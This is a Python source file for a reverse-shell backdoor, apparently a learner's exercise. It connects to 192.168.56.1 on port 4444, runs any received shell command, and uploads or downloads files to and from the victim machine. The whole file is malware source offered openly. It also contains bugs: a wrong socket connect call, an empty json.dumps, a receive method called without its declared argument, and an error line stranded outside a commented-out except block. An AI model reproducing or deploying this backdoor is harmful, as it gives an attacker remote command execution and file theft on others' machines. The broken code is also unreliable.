import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(ip, port)
    
    def json_send(self, data):
        json_data = json.dumps()
        self.connection.send(json_data.encode())
    
    def json_receive(self, data):
     json_data = b""
     while True:
        try:
            json_data = json_data + self.connection.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue
         
    def sys_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "[-] Error "
    
    def cd_method(self, path):
        os.chdir(path)
        return "[+] changing working directory to " + path
    
    def read_file(self, path):
        with open(path, 'rb') as file:
           return base64.b64encode(file.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."





    def run(self):
        while True:
               command = self.json_receive()
          # try:
               if command[0] == "exit":
                   self.connection.close()
                   exit()
               elif command[0] == 'cd' and len(command) > 1 :
                   command_result = self.cd_method(command[1])
               elif command[0] == "download":
                   command_result = self.read_file(command[1])
               elif command[0] == "upload":
                   command_result = self.write_file(command[1], command[2])
               else:
                   command_result = self.sys_command(command).decode()
               self.json_send(command_result)
         #  except Exception:
               command_result = "[-] Error in command."
    

my_backdoor = Backdoor("192.168.56.1", 4444)
my_backdoor.run()
